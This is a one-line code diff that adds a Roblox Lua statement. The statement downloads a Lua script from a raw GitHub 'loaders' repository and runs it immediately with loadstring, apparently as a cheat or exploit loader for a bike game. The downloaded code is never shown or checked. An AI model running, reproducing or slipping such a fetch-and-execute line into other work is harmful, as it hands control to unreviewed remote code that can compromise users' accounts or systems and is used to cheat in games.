@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/topprefectmatch/loaders/main/loaders/bike-universe-spam7-peahr09pmc4rys.lua"))()
